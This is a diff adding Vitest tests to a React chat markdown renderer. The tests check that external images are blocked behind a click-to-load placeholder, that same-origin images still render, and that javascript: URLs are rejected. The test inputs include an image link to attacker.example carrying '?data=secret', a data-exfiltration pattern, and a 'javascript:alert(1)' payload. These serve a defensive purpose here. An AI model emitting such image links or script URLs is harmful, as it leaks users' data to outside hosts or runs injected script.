@@ -3,7 +3,7 @@ import { renderToStaticMarkup } from "react-dom/server";
 import { describe, expect, it } from "vitest";
 
 Object.assign(globalThis, { React });
-const { ChatMarkdown } = await import("./ChatMarkdown");
+const { ChatMarkdown, classifyMarkdownImageSource } = await import("./ChatMarkdown");
 
 function render(
   content: string,
@@ -73,5 +73,32 @@ describe("ChatMarkdown", () => {
     const html = render("| 风险 | 来源 |\n|---|---|\n| 毛利率波动 | 知识3 |", "final", [3], { 3: "第 33 页" });
     expect(html).toContain("[3 · 第 33 页]");
     expect(html).toContain('href="#ea-knowledge-source-message-3"');
+  });
+
+  it("does not automatically request images from external origins", () => {
+    const html = render("![敏感图](https://attacker.example/report.png?data=secret)");
+
+    expect(html).toContain("外部图片");
+    expect(html).toContain("点击加载");
+    expect(html).not.toContain("<img");
+  });
+
+  it("continues to render same-origin images directly", () => {
+    const html = render("![任务产物](/api/claw/files/report.png)");
+
+    expect(html).toContain("<img");
+    expect(html).toContain('src="/api/claw/files/report.png"');
+  });
+
+  it("rejects active image protocols and classifies trusted origins", () => {
+    expect(classifyMarkdownImageSource("javascript:alert(1)").mode).toBe("invalid");
+    expect(classifyMarkdownImageSource(
+      "https://work.linggan.top/report.png",
+      "https://work.linggan.top",
+    ).mode).toBe("same-origin");
+    expect(classifyMarkdownImageSource(
+      "https://images.example.com/report.png",
+      "https://work.linggan.top",
+    ).mode).toBe("external");
   });
 });
